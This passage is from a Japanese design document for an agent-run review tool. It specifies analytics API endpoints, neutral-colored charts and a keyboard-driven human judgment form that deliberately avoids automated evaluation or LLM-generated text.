# make_con をパス引数化(既存 CLI は make_con() のデフォルト DB を使い続けられる)
def make_con(db: Path = DB, read_only: bool = False) -> duckdb.DuckDBPyConnection:
    con = duckdb.connect()
    try:
        con.execute("INSTALL sqlite; LOAD sqlite;")
    except duckdb.Error:
        pass
    ro = ", READ_ONLY" if read_only else ""
    con.execute(f"ATTACH '{db}' AS src (TYPE sqlite{ro});")
    con.execute("CREATE VIEW runs AS SELECT * FROM src.runs;")
    return con


def fetch_dicts(con, sql: str, params: list | None = None) -> list[dict]:
    cur = con.execute(sql, params or [])
    cols = [d[0] for d in cur.description]
    return [dict(zip(cols, r)) for r in cur.fetchall()]
```

`queries/*.sql` は **canned クエリの単一の定義元として維持**し、API もそのファイルを `read_text()` して実行する(クエリ文字列を Python 側にコピペしない)。期間フィルタ等のパラメータは下記 5.4 の方式で付与する。

### 5.3 クエリ → エンドポイント写像表

すべて `GET`、`Content-Type: application/json`、read-only。プレフィックスは `/api/stats/`。レスポンスは `{ "generated_at": "<ISO8601>", "source": "loop.db (derived index)", "rows": [...] }` の封筒(envelope)で包み、UI が「これは MD 派生インデックスのスナップショットだ」と明示できるようにする(5.6 の思想ガード)。

| エンドポイント | 元 SQL / ロジック | rows の要素(JSON 形) | 主用途のチャート |
|---|---|---|---|
| `GET /api/stats/pass-rate-by-skill` | `queries/pass_rate_by_skill.sql` | `{skill_sha: str, pass_rate: float, avg_cost: float, n: int}` | skill_sha 別バー(pass_rate)+ n をツールチップ |
| `GET /api/stats/verdict-summary` | `queries/verdict_summary.sql` | `{verdict: str, n: int, unreviewed: int, avg_cost: float, avg_turns: float}` | verdict 構成の積み上げ/ドーナツ + 未レビュー数バッジ |
| `GET /api/stats/gaming-suspects` | `queries/gaming_suspects.sql` | `{run_id: str, task: str, test_verdict: str, verifier_verdict: str, verifier_confidence: str, started_at: str}` | テーブル(時系列降順)。各行は run 詳細へリンク |
| `GET /api/stats/cost-timeline` | 新規(下記) | `{run_id: str, started_at: str, cost_usd: float, turns: int, verdict: str, skill_sha: str}` | コスト/turns の時系列散布・折れ線 |
| `GET /api/stats/summary` | 新規(軽量集計) | `{total_runs:int, reviewed:int, unreviewed:int, pass:int, fail:int, distinct_skills:int}` | ヘッダーの数値カード群 |

`cost-timeline` の新規 SQL は `queries/cost_timeline.sql` として追加し CLI からも見えるようにする:

```sql
-- run ごとのコスト/ターン推移(時系列。pass率の劣化やコスト膨張を目で追う素材)
SELECT run_id, started_at, cost_usd, turns, verdict, skill_sha
FROM runs
WHERE started_at IS NOT NULL
ORDER BY started_at ASC;
```

`summary` は単一クエリで十分:

```sql
SELECT COUNT(*) AS total_runs,
       SUM(reviewed) AS reviewed,
       SUM(CASE WHEN reviewed=0 THEN 1 ELSE 0 END) AS unreviewed,
       SUM(CASE WHEN verdict='pass' THEN 1 ELSE 0 END) AS pass,
       SUM(CASE WHEN verdict='fail' THEN 1 ELSE 0 END) AS fail,
       COUNT(DISTINCT skill_sha) AS distinct_skills
FROM runs;
```

エンドポイント実装スケッチ(`webapp/main.py` 相対、JSON API 化後):

```python
import stats  # stats.py を import(make_con/fetch_dicts を再利用)

def _stats_rows(sql_file: str, params: list | None = None) -> dict:
    con = stats.make_con(runner.DB, read_only=True)  # 毎回作り捨て・read-only
    try:
        sql = (runner.ROOT / "queries" / sql_file).read_text(encoding="utf-8")
        rows = stats.fetch_dicts(con, sql, params)
    finally:
        con.close()
    return {
        "generated_at": datetime.now().isoformat(timespec="seconds"),
        "source": "loop.db (derived index; authoritative=runs/*.md)",
        "rows": rows,
    }

@app.get("/api/stats/pass-rate-by-skill")
def stats_pass_rate():
    return JSONResponse(_stats_rows("pass_rate_by_skill.sql"))
```

float の JSON 直列化に注意: DuckDB の `AVG` は `Decimal`/`float` を返しうるので、`fetch_dicts` 後に `Decimal → float` 変換を一箇所で行う(`isinstance(v, Decimal)` を round せず `float(v)` 化。**丸めや「○%」整形はフロントに任せ、API は生値を返す** — API が解釈を加えないため)。

### 5.4 期間フィルタ・ページング(将来 run 増加への備え)

run が数千件規模になった時に備え、最初から下記をクエリに織り込む。ただし過剰実装は避け、**フィルタは `started_at` の範囲とページングの 2 つだけ**を共通化する。

- 共通クエリパラメータ: `?since=<ISO8601>&until=<ISO8601>&limit=<int>&offset=<int>`。
- パラメータ化は文字列連結を禁止し、DuckDB のプレースホルダ(`?`)で渡す。canned SQL ファイルはベース集計を定義し、API 側で `WHERE`/`LIMIT` を**安全に注入できる形**にするため、各 canned SQL を「`WHERE 1=1 {date_clause}` を含むテンプレート」ではなく、**サブクエリでラップ**する方式を採る:

```python
def _with_window(base_sql: str, since, until, limit, offset):
    clauses, params = [], []
    if since: clauses.append("started_at >= ?"); params.append(since)
    if until: clauses.append("started_at <= ?"); params.append(until)
    where = (" WHERE " + " AND ".join(clauses)) if clauses else ""
    sql = f"SELECT * FROM ({base_sql.rstrip().rstrip(';')}) AS sub{where}"
    if limit is not None:
        sql += " LIMIT ? OFFSET ?"; params += [limit, offset or 0]
    return sql, params
```

これにより canned SQL を改変せず、CLI(`stats.py`)の出力と API の集計母集合を完全一致させられる(ただし集計系 `pass_rate_by_skill`/`verdict_summary` は `started_at` を select していないため、期間フィルタを効かせたい場合はラップではなく **canned SQL 自身に `started_at` を通す形へ将来拡張**するか、フィルタ対象を `gaming-suspects`/`cost-timeline`/`summary`(行レベルに `started_at` を持つもの)に限定する。**推奨: 期間フィルタは行レベル系の 3 エンドポイントのみ対応とし、集計系は「全期間」固定で開始**。需要が出たら集計系 SQL を `GROUP BY` 前に期間 WHERE を入れる形へ拡張する)。

- ページング: `gaming-suspects` と `cost-timeline` に `limit`(既定 200)/`offset` を付与。レスポンス封筒に `"has_more": bool` を含め、フロントの「さらに読み込む」を可能にする。総件数の `COUNT(*)` は別問い合わせにせず、`has_more` は `len(rows) == limit` で近似する(正確な総数は不要、事実表示に過剰)。

### 5.5 フロント: チャート選定と各指標の可視化形

**推奨(決定): shadcn/ui の Chart コンポーネント(内部は Recharts)を採用する。** 理由: shadcn/ui を全面採用する刷新方針と一体で、`ChartContainer`/`ChartTooltip` が Tailwind トークンとテーマに馴染み、Recharts の表現力(Bar/Line/Scatter)を素のまま使える。D3 直書きや重量級 BI ライブラリ(visx, nivo)は不要。

データ取得は Next.js App Router の Server Component で `fetch('http://127.0.0.1:8765/api/stats/...', { cache: 'no-store' })` を基本とし(分析は常に最新スナップショットを見たい)、期間フィルタ等のインタラクションが要る画面のみ Client Component + SWR/`useQuery` にする。SSE は分析ダッシュボードでは**使わない**(リアルタイム監視は §4 の責務。分析は「過去の集計」であり定期再取得で足りる。誤ってここにライブ更新を持ち込むと §4 と責務が重複する)。

| 指標 | チャート | 形 |
|---|---|---|
| pass 率(skill 別) | 横棒(BarChart) | `skill_sha` を短縮表示(先頭 7 桁)、x=pass_rate(0–1 を % 表示はフロント整形)、バー横に `n=` を素の数字で。色は verdict 由来の色を使わず**中立(単色)**にする(良し悪しの含意を避ける、5.6) |
| pass 率の時系列 | 折れ線(LineChart) | `cost-timeline` の rows を `started_at` で日次/週次にフロント側ビニングし、各バケットの pass 率を点で結ぶ。**トレンドラインや予測は引かない**(事実点のみ) |
| verdict 構成 | ドーナツ or 積み上げバー | `verdict_summary` を件数で。`unreviewed` は別バッジ(数値)で併記。「未レビュー = 悪い」という色付けはしない |
| コスト/turns 分布 | 散布図(ScatterChart) | x=turns, y=cost_usd、点=run、色=verdict(色は識別目的のカテゴリ色であって評価色ではない旨を凡例に明記) |
| gaming 疑い一覧 | データテーブル(shadcn Table) | チャートではなく**一覧**。`started_at` 降順、各行クリックで run 詳細(§3)へ。`verifier_confidence` はそのまま文字列表示。見出しは「test pass/none かつ verifier fail の run」と**機械的事実の記述**にとどめ、「gaming」という語は queries 由来のラベルとして付すに留め、UI コピーは断定しない(5.6) |
| サマリ | 数値カード群 | total/reviewed/unreviewed/pass/fail/distinct_skills を素の数字で |

### 5.6 思想ガード(種類B の自動化禁止の境界)

このダッシュボードが越えてはならない線を明文化する。実装者はレビュー時にこの表を判定基準にすること。

**やってよい(種類A = 事実の集計表示):**
- DB に既にある列(`verdict`, `cost_usd`, `turns`, `*_verdict`, `*_confidence`)を `COUNT`/`AVG`/`GROUP BY`/期間フィルタしてそのまま見せる。
- `gaming_suspects.sql` の機械的条件(`test∈{pass,none} ∧ verifier=fail`)で run を**並べる**。これは SQL の事実フィルタであって判断ではない(誰が見ても同じ結果)。
- 各 run から実物(`runs/<id>.md`、per-run 証拠)への**リンク**を張る。判断材料(生 run)へ最短で到達させるのは UX 高速化であり、判断の代行ではない。

**やってはならない(種類B = 判断の生成・要約・推奨):**
- 閾値を超えたメトリクスに「危険」「異常」「劣化」「要改善」等の評価ラベルや色(赤=悪)を付ける。pass 率が低い skill_sha を「失敗」と表示しない。**API は生値のみ、フロントは中立色で数値を出す。**
- 「この skill は使うべきでない」「次はこれを検証せよ」等の推奨・next-action を生成しない。
- LLM 等でメトリクスを要約・コメント生成しない(「pass 率が下降傾向です」という文すら自動生成しない。トレンド断定は判断)。
- gaming 疑い run に「gaming の可能性が高い」等の確信度を**ダッシュボードが付与**しない。`verifier_confidence` は runner(Verifier 役)が生成した事実値であり、それを**表示するだけ**は可。ダッシュボードが新たに信用度を計算・推定したら越境。

境界の一文での言い方: **「runner(と SQL の機械的条件)が既に確定させた事実を並べ替えて見せるのは可。ダッシュボードが新しい意味づけ・序列・推奨を**生成**したら不可。」** pass 率を出すのは事実、「pass 率が低い=悪い」と着色するのは判断。前者のみ。

### 5.7 再計算コスト・キャッシュ・reindex との関係

- **データ源は常に `loop.db`(`runner.DB`)経由**で、`runs/*.md` を API が直接全件パースしない。MD 直読みは O(ファイル数) で run 増加に比例して重くなる。集計は SQLite/DuckDB に任せる(これが loop.db = 使い捨てインデックスを持つ目的そのもの)。
- DuckDB インメモリ接続はリクエストごとに作り捨て(5.2)。canned 集計は数千行規模では数 ms〜十数 ms で、**サーバー側キャッシュは初期不要**。入れるとしてもプロセス内 TTL 数秒の薄いメモ化(`functools` + 時刻キー)に留め、外部キャッシュ(Redis 等)は導入しない(ローカル単一オペレータ前提に過剰)。
- フロント側は Server Component の `no-store` で都度取得 + 手動「更新」ボタン。自動ポーリングは入れない(分析は静的事実、ライブは §4 の責務)。
- **reindex との関係(重要)**: 集計の鮮度は `loop.db` の鮮度に等しい。各 run は完了時に `loopdb.upsert` 済みなので通常は最新だが、`runs/*.md` を手で編集した/別マシンで生成した MD を取り込んだ場合は DB が古い。よって:
  - ダッシュボードに **`POST /api/reindex`(明示トリガ)**を 1 つ用意し、`loopdb.reindex(loopdb.connect(runner.DB), runner.RUNS)` を呼ぶ。返り値の件数を表示。
  - 現状 `webapp/main.py:48` の `_reindex_on_startup` 相当のように起動時 reindex があるが、ダッシュボードは**集計のたびに reindex しない**(MD 全件再読は run 増加でコスト線形。集計のたびにやると DuckDB 集計の軽さが台無し)。
  - reindex は `loop.db` を**完全再生成**できる(`reindex` が `DROP TABLE` → 再構築)ので、DB が壊れても MD から無損失で復旧する。この事実をダッシュボードの「データ源」注記に明記し、**loop.db が authoritative でない**ことを UI 上でも担保する(封筒の `source` フィールドがその役割)。
  - reindex(SQLite への書き込み)と分析の DuckDB read-only ATTACH が同時に走る競合は、reindex を明示トリガに限定したことで実運用上ほぼ起きない。run 並列化が入った場合の WAL 化要否は open question に分離。

### 5.8 実装チェックリスト(着手順)

1. `stats.py` の `make_con` をパス/`read_only` 引数化し、`fetch_dicts` を追加(CLI 既存挙動は不変)。
2. `queries/cost_timeline.sql` と `summary` 用 SQL を追加(CLI からも見える単一定義元)。
3. `webapp/main.py` に `import stats` と 5.3 の 5 エンドポイント + `POST /api/reindex` を追加。`Decimal→float` 変換を `fetch_dicts` 後段に一箇所。
4. Next 側 `/dashboard` ルート(App Router、Server Component)で各 API を `fetch`、shadcn Chart で 5.5 の図を描画。色は中立 + カテゴリ識別色のみ、評価色禁止。
5. gaming-suspects テーブルの各行を §3 run 詳細へリンク。
6. レビュー観点として 5.6 の境界表を必ず通す(評価ラベル/色/推奨/自動要約が混入していないか)。

---

<a id="6"></a>

## 6. レビュー(種類B)UX の高速化

### 6.0 このセクションの射程と非射程

焦点は「人間が `runs/<id>.md` の判断セクションを書く」という種類Bの作業そのものの体感速度を上げることだけに置く。具体的には (a) 未レビュー run を最短手数で次々に捌くキュー導線、(b) 差分・証拠・transcript を見ながら判断テキストを書くための左右並置レイアウト、(c) `j/k` での移動・`⌘↵` での保存というキーボード操作。

非射程は明示しておく。本セクションは判断の**中身**には一切踏み込まない。GUI は問い(プレースホルダ)とフォーム枠と保存通路を提供するだけで、信用度・破綻箇所・推奨を生成・要約・補完しない。SSE/並行表示の基盤(§3 想定)、分析ダッシュボード(§4 想定)、認証・リモート(§5 想定)は本セクションでは設計せず参照に留める。

中心思想との関係を最初に固定する。

- 判断の単一の真実は `runs/<id>.md` の `## 判断` セクションと `review-notes.md`。Next も FastAPI もここに直接 SQL を書いてはならない。書き込みは必ず `runner.write_judgment()` を通す。
- `loop.db` は MD 派生の使い捨てインデックス。未レビューキューの表示には `loop.db` を読んでよいが、reviewed 状態の権威は MD の front-matter `reviewed:` であり、`loop.db` の `reviewed` 列はそれを `loopdb.upsert_md()` で再導出した影に過ぎない。
- ゆえに「保存」操作の後処理(MD 置換 → review-notes 追記 → reviewed 化 → upsert → auto_commit)は**1関数 `runner.write_judgment()` に閉じたまま**にし、Next 側で部分的に再実装しない。これがロジック二重化回避(ユーザー確定方針)の核心。

### 6.1 現状実装の確定事実(接地)

推測を避けるため、刷新が依拠・保存しなければならない現行コードを列挙する。相対パスは engine repo ルート起点。

`runner.py`:

- `JUDGMENT_HEADING = "## 判断"`(57行目)。判断セクションの開始マーカー。
- `JUDGMENT_FIELDS`(714-719行目): `[("trust","信用できるか"), ("risk","失敗/リスク"), ("checks","自動検証に入れるべきチェック"), ("learning","学び")]`。フォーム field 名と MD の `### ラベル` の対応かつ表示順。**この4本がフォームの全フィールド**であり、増減はここを唯一の源とする。
- `parse_judgment(md) -> dict`(722-741行目): `## 判断` 以降を `### ` サブ見出しで区切り、各 field の現在値を `"\n".join(buf).strip()` で取り出す。**複数行・複数段落をそのまま保持する**(prefill 用)。`## 判断` が無ければ空 dict。
- `write_judgment(run_id, fields, cfg)`(744-774行目): 種類Aの後処理を一括で行う唯一の通路。
  1. MD を行配列化し `JUDGMENT_HEADING` の先頭行 `head` を探す。
  2. `## 判断 ← 人間がここだけ書く（種類B / 自動化しない）` 見出し + 各 field を `### ラベル` + 空行 + 値(`strip()` 後、非空のときだけ)で再構築し `lines[:head]` に連結して**判断セクション全体を置換**。
  3. `checks` が非空なら `review-notes.md` に `- <YYYY-MM-DD> <run_id>: <1行目>` + 2行目以降をインデント追記。
  4. `set_md_reviewed(md)` で front-matter の `reviewed:` を `true` 化(無ければ `---` 直後に挿入)。
  5. `loopdb.connect(DB)` → `loopdb.upsert_md(conn, md)` → `close()` で SQLite 再導出。
  6. `auto_commit(DATA, [md, REVIEW_NOTES], f"review: {run_id} 判断を記入し reviewed 化")` で data/ git へコミット。
- `unreviewed_runs() -> list[Path]`(702-708行目): `RUNS.glob("*.md")` を front-matter の `reviewed` で素朴に絞る。MD 直読み・ソートは `run_id` 昇順。
- `set_md_reviewed` / `mark_reviewed` も存在するが、フォーム保存の正規ルートは `write_judgment` 一本。

`webapp/main.py`:

- `GET /run/{run_id}`(83-106行目): MD を読み front-matter・Implementer 最終出力・`verifier.json`・`_evidence()`・`parse_judgment()`・`JUDGMENT_FIELDS` を Jinja に渡す。
- `POST /run/{run_id}/judge`(109-114行目): `trust/risk/checks/learning` を `Form("")` で受け、`write_judgment` に丸投げ → 303 redirect。**field 名がベタ書き**されている点が今回の API 設計の出発点。
- `_SAFE_ID = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]*$")`(119行目): run_id 検証に流用できる(現状 detail/judge は未検証なので新 API では適用する)。

`webapp/templates/detail.html` / `base.html`:

- 現 `.review-pane`(base.html 47-57行目)は `position:sticky; top:1rem; height:calc(100vh - 5rem)` の縦いっぱい・固定ペイン。`.judgment-form` は flex 縦、各 `textarea` が `flex:1 1 0`、`learning` だけ `grow2`(`flex:2.2`)。**この「ビューポート縦を全部使ってテキストを書く」設計を踏襲する。**
- 左カラムに証拠(`change.patch` の add/del/hd 色分け、`test-output.txt`、transcript リンク)、右カラムに判断フォーム。`.grid` は `minmax(0,1fr) minmax(0,1fr)` で長い diff 行が右ペインを画面外に追い出さない工夫済み。これも踏襲する。

### 6.2 推奨設計(決定): JSON API + Next クライアントフォーム、Server Action は使わない

#### 決定

判断の取得・保存は **FastAPI の JSON API** で行い、**Next 側は client component のフォーム + `fetch()`** で叩く。Next の Server Action は**使わない**。

#### 理由(両論を畳んで推す案を決める)

- 案A(Server Action 経由): Next Server Action から FastAPI を `fetch` するか、あるいは Server Action 内で直接 Python を呼ぶ。後者は不可能(Server Action は Node 実行で `runner.py` を import できない)。前者は「Next Server → FastAPI」の余計な1ホップが増え、認証トークンの二重持ち回しが要る。判断保存は2プロセス境界を1回だけ越えれば十分で、Server Action は利得がない。
- 案B(client `fetch` 直叩き)【採用】: ブラウザ → FastAPI JSON API を直接叩く。`runner.write_judgment` への通路が最短(Next はテキストを運ぶだけ)。`⌘↵` 保存・楽観的UIなしの確実な保存・保存後の次 run 遷移をクライアントで素直に書ける。`runner/loopdb` import を FastAPI に残すユーザー確定方針とも一致。

ゆえに案Bを採用。Next は「テキスト入力 → POST → レスポンスで次へ」の薄い層に徹し、判断ロジックは持たない。

### 6.3 エンドポイント署名(JSON API)

すべて `/api` 接頭辞。run_id は `_SAFE_ID` で検証し、不正なら 400。

#### (1) 判断フォームの初期値取得

```
GET /api/runs/{run_id}/judgment
→ 200 application/json
```

レスポンス(`parse_judgment` の結果 + フォーム定義をそのまま JSON 化):

```jsonc
{
  "run_id": "2026-06-16T0931-abcd",
  "reviewed": false,                 // fm.reviewed の真偽(loop.db ではなく MD front-matter 由来)
  "fields": [                        // JUDGMENT_FIELDS の順序を保持。Next はこの配列順で描画する
    { "key": "trust",    "label": "信用できるか",                 "value": "" },
    { "key": "risk",     "label": "失敗/リスク",                  "value": "" },
    { "key": "checks",   "label": "自動検証に入れるべきチェック", "value": "" },
    { "key": "learning", "label": "学び",                          "value": "" }
  ]
}
```

実装スケッチ(`webapp/api/judgment.py` 想定、相対パスは新設):

```python
@router.get("/api/runs/{run_id}/judgment")
def get_judgment(run_id: str):
    if not _SAFE_ID.match(run_id):
        raise HTTPException(400, "invalid run_id")
    md = runner.RUNS / f"{run_id}.md"
    if not md.exists():
        raise HTTPException(404, "run not found")
    fm = loopdb.parse_front_matter(md.read_text(encoding="utf-8"))
    values = runner.parse_judgment(md)  # {key: 値(改行保持)}
    return {
        "run_id": run_id,
        "reviewed": str(fm.get("reviewed", "false")).lower() in ("true", "1"),
        "fields": [
            {"key": key, "label": label, "value": values.get(key, "")}
            for key, label in runner.JUDGMENT_FIELDS  # 順序の唯一の源
        ],
    }
```

ポイント: `fields` の `key/label/value` を**サーバーが `JUDGMENT_FIELDS` から生成**する。Next 側に field 名をハードコードしない(現 `judge()` のベタ書きを繰り返さない)。これでフィールドの増減が runner.py 1ヶ所で完結する。

#### (2) 判断の保存(reviewed 化まで)

```
POST /api/runs/{run_id}/judgment
Content-Type: application/json
```

リクエストボディ(キーは `JUDGMENT_FIELDS` の key と一致):

```jsonc
{ "trust": "...", "risk": "...", "checks": "- ...\n- ...", "learning": "..." }
```

レスポンス(保存後の権威状態を返し、クライアントの楽観表示と突き合わせ):

```jsonc
{ "run_id": "...", "reviewed": true, "next": "2026-06-16T0944-ef01" }
```

`next` は同一フィルタ条件での「次の未レビュー run_id」(無ければ `null`)。サーバーが返すことで、保存直後にクライアントが追加クエリせず `j` 遷移できる。

実装スケッチ:

```python
class JudgmentBody(BaseModel):
    trust: str = ""
    risk: str = ""
    checks: str = ""
    learning: str = ""

@router.post("/api/runs/{run_id}/judgment")
def post_judgment(run_id: str, body: JudgmentBody):
    if not _SAFE_ID.match(run_id):
        raise HTTPException(400, "invalid run_id")
    md = runner.RUNS / f"{run_id}.md"
    if not md.exists():
        raise HTTPException(404, "run not found")
    # 唯一の保存通路。MD 置換→review-notes 追記→reviewed 化→upsert→auto_commit を内包
    runner.write_judgment(run_id, body.model_dump(), runner.load_config())
    nxt = _next_unreviewed_after(run_id)  # §6.5 のキュー順に従う
    return {"run_id": run_id, "reviewed": True, "next": nxt}
```

`body.model_dump()` の dict キーは `JUDGMENT_FIELDS` の key と一致するので `write_judgment` がそのまま消費する。**改行は JSON の文字列値として透過**し、`write_judgment` が `strip()` するのは前後空白のみ・段落間改行は保持される(§6.6)。

`Pydantic` モデルは `JUDGMENT_FIELDS` に追従させたいが、Pydantic は静的フィールド宣言が前提なので、現状の4本に固定した `JudgmentBody` を置きつつ「フィールドを増やすときは `JudgmentBody` と `JUDGMENT_FIELDS` を同時に編集」というコメントを1行入れる(`runner.JUDGMENT_FIELDS` を真とし、ズレたら起動時 assert で落とす — §6.10 open question)。

#### (3) 未レビューキュー

```
GET /api/runs/unreviewed?repo=<r>&verdict=<v>&limit=<n>
→ 200
```

```jsonc
{
  "count": 7,
  "items": [
    { "run_id": "...", "task": "...", "verdict": "pass", "repo": "engine",
      "verifier_verdict": "pass", "started_at": "2026-06-16T09:31" }
  ]
}
```

ここは表示専用なので `loop.db`(`SELECT ... WHERE reviewed=0`)を読んでよい。ただし「reviewed の権威は MD」原則を守るため、`_reindex_and_query` 同様に **まず `loopdb.reindex(conn, RUNS)` で MD から再導出してから** クエリする。MD が真・DB は派生、を毎回担保する。

### 6.4 画面構成: 未レビュー捌きのレビュー画面

Next 側ルート(App Router、相対パスは Next プロジェクト起点):

- `app/review/page.tsx`: 未レビューキュー一覧(`GET /api/runs/unreviewed`)。各行クリックで下記へ。
- `app/review/[runId]/page.tsx`: レビュー本体。左に証拠・右に判断フォーム(現 detail.html の `.grid` + `.review-pane` を Tailwind/shadcn で再現)。

レイアウト(現 base.html の踏襲をそのまま Tailwind 化):

- 親: `grid grid-cols-1 lg:grid-cols-2 gap-6 items-start`、両カラム `min-w-0`(長い diff 行対策)。
- 左カラム(証拠、スクロール可): Verifier 判定(`verifier.json`)、`change.patch` の add/del/hunk 色分け、`test-output.txt`、transcript リンク。diff は shadcn の Card 内で等幅・色分け。
- 右カラム(判断ペイン、`sticky top-4 h-[calc(100vh-5rem)] flex flex-col`): 各フィールドの `<Textarea>` を `flex-1`、`learning` だけ `flex-[2.2]`(現 `.grow2` 相当)。これでビューポート縦を判断記入に最大化する。

shadcn コンポーネント割当: 入力は `Textarea`、保存は `Button`、キュー一覧は `Table` か縦リスト、フィールドラベルは素の `<label>`。**Form ライブラリの自動バリデーション・自動補完・サジェスト機能は使わない**(思想ガード §6.7)。

### 6.5 キーボード操作と「捌く」導線

未レビューキューの順序を1ヶ所で定義し、`j/k` と保存後の `next` が同じ順序を使う。

- 順序の定義: `unreviewed` の `started_at DESC, run_id DESC`(`_reindex_and_query` と同じ)を正準とする。`_next_unreviewed_after(run_id)` はこの並びで「現在 run の次」を返す。
- キーバインド(`app/review/[runId]/page.tsx` の client component で `keydown` を捕捉):
  - `j`: キュー上の次の未レビューへ遷移(`router.push`)。テキストエリアに focus がある間は無効化(`j` を入力できるように)。フォーカスは「フィールド外」のときだけバインド有効、というモードを持つ。`Esc` でテキストエリアから抜け、`j/k` が効く状態へ。
  - `k`: 前へ。
  - `⌘↵`(mac)/`Ctrl+↵`: 保存。テキストエリア内でも有効(`metaKey/ctrlKey && key==='Enter'`)。保存成功のレスポンス `next` があれば自動でそこへ遷移、無ければキュー一覧へ戻る。
  - `g`: キュー一覧 `/review` へ戻る。
- 保存はモーダルなし・楽観表示なしの確実保存。`POST` の 200 を待ってから遷移する(`auto_commit` まで完了した = 契約ファイルが確定した、を保証する)。失敗時はトーストでエラーを出し、入力テキストは消さない。

「⌘↵ で次へ」が成立することで、未レビュー run を「読む→4枠書く→⌘↵→次」の単一リズムで捌ける。これが本セクションの体感速度の主目的。

### 6.6 改行・複数段落の保持(parse/write を壊さない)

絶対要件: `parse_judgment` / `write_judgment` の「複数行・複数段落をそのまま保持」を JSON 往復で壊さない。

- 取得: `parse_judgment` の値は `"\n".join(buf).strip()`。JSON 文字列にそのまま入れれば `\n` は保存される。Next の `<Textarea defaultValue={value}>` に流せば改行込みで復元される。**HTML エスケープや trim をクライアントで追加しない。**
- 保存: `<Textarea>` の `value` を**無加工で** JSON に載せる。`value.trim()` をクライアントでかけない(末尾の意図的な空行は `write_judgment` 側の `strip()` に委ねる。二重 strip は段落構造を変えないが、責務を runner に一本化する)。
- 検証ポイント(実装者向けテスト): 3段落 + 箇条書きを含む `learning` を入力 → 保存 → `GET` で取り直したとき、段落間の空行と箇条書きの行頭が一致すること。`checks` を複数行入れたとき `review-notes.md` に1行目が `- <date> <id>: ` 形式、2行目以降が2スペースインデントで追記されること(`write_judgment` 762-768行目の挙動)。

CRLF 混入対策: ブラウザの `<textarea>` は環境により `\r\n` を送ることがある。FastAPI 受信直後に `value.replace("\r\n", "\n")` で正規化してから `write_judgment` に渡す(MD に `\r` を混ぜない)。この正規化は API 層で行い、`write_judgment` 側は触らない。

### 6.7 思想ガード: GUI が判断を生成しない(禁止線)

このフォームは「人間が書く欄」であり、GUI が中身を作る誘惑が最も強い箇所。以下を**実装禁止**として明文化する。

禁止(レビューで弾く対象):

- オートサジェスト/オートコンプリート: `<Textarea>` に候補・補完・履歴サジェストを出さない。shadcn の Combobox/Autocomplete をこのフォームに使わない。ブラウザ補完も `autoComplete="off"` で抑止。
- 要約・下書き生成: Verifier の `reasons` や Implementer 出力を**判断欄に prefill しない**。prefill は `parse_judgment` が返す「過去に人間が書いた値」のみ。
- テンプレ補完: 「pass なら trust を埋める」等の連動を入れない。verdict や verifier_verdict をフォーム値に反映しない。
- 推奨表示: 「pass を推奨」「reviewed にしてよい」等の文言・バッジ・色誘導を判断ペインに出さない。Verifier 判定は左カラムの**事実表示**に留め、右カラムの判断行為と視覚的に等価扱いしない。
- 必須化による誘導: 「全フィールド必須」「checks 空なら警告」等で人間に特定の記述を強いない(空欄は人間の判断結果として許容。`write_judgment` も空欄を許容する)。
- LLM 呼び出し: このフォーム経路から `claude -p` 等を一切呼ばない。

許可(事実要約と問いまで):

- プレースホルダは**問い**まで。各フィールドの `placeholder` は以下に固定(runner 側 `JUDGMENT_FIELDS` を拡張して `(key, label, placeholder)` 3タプル化するか、Next 側に静的辞書として持つ — §6.10):
  - `trust`: 「この run の結果を信用できるか?(根拠とともに)」
  - `risk`: 「破綻箇所・失敗・残るリスクは?」
  - `checks`: 「次に自動検証へ入れるべきチェックは?(review-notes.md に追記される)」
  - `learning`: 「この run から得た学びは?」
- 左カラムの事実表示(diff・test 出力・Verifier の `reasons`/`criteria`)は runner が作った事実なので**表示は自由**。ただし右の判断欄へ流し込まない。

レビュー観点(PR チェックリストに入れる): 判断ペインのコンポーネントが Verifier/Implementer の出力を `defaultValue`/`value` として参照していないこと、LLM クライアントを import していないこと。

### 6.8 reviewed 化と loop.db upsert の整合

- API 経由でも reviewed 化の後処理は `write_judgment` 内の `set_md_reviewed → upsert_md → auto_commit` を通る。**Next/FastAPI で reviewed フラグを別途立てない。** front-matter の `reviewed:` が権威、`loop.db.runs.reviewed` はその派生。
- 「未レビューキュー(§6.3 (3))」は表示前に `loopdb.reindex` を呼ぶので、保存直後にキューを取り直せば消えている(MD が真 → 再導出済み)。保存レスポンスの `next` でクライアント遷移するため、通常は再クエリ不要だが、一覧へ戻ったときは最新が出る。
- 二重保存の冪等性: `write_judgment` は判断セクションを毎回**全置換**する(差分追記でなく置換)ので、同じ run を再保存しても MD は壊れず、`review-notes.md` だけは追記なので重複行が増える点に注意。UX として「保存済み run の再保存」は reviewed 済みバッジを出して**確認ダイアログ**を1枚挟む(§6.10 で扱う review-notes 重複の緩和方針を参照)。これは「推奨」ではなく事実(既に reviewed)の提示なので思想ガードに抵触しない。

### 6.9 並行 run / 同時編集との関係(参照に留める)

- data/ への `auto_commit` は §2/§3 の並列化論点。本セクションの保存は1回の人間操作=1コミットで、レビュー保存同士が高頻度に衝突する状況は単一オペレータ前提では稀。ただし「dispatch 中の run コミット」と「レビュー保存コミット」が重なると `index.lock` 競合が起き得る。緩和は §3(data/ コミットのシリアライズ)に委ね、本セクションでは `write_judgment` を**そのまま使う**(独自ロックを足さない)に留める。重なった場合の API は 500 を返し、クライアントは入力を保持したまま「保存に失敗。再試行」を出す(テキストを失わせない)ことだけ保証する。

### 6.10 トレードオフまとめと推奨の確認

- Server Action vs client fetch → **client fetch を推奨**(§6.2)。判断は2プロセス境界を1回だけ越える薄い通路で十分、ロジックは runner に集約。
- field 定義の源 → **`runner.JUDGMENT_FIELDS` を唯一の源**とし API が JSON 化して配る。Next にハードコードしない。Pydantic の `JudgmentBody` だけは静的宣言が要るので、起動時に `set(JudgmentBody.model_fields) == {k for k,_ in JUDGMENT_FIELDS}` を assert してズレを早期検出する。
- placeholder(問い)の置き場所 → **runner 側に持たせる**ことを推奨。`JUDGMENT_FIELDS` を `(key, label, placeholder)` の3タプルに拡張すれば、フィールド定義と問いが1ヶ所に揃い、Next は API 経由で受け取るだけになる。これは「問いまでは許可」の範囲で、生成ではないため思想に反しない。

---

<a id="7"></a>

## 7. リモートアクセス・認証・セキュリティ

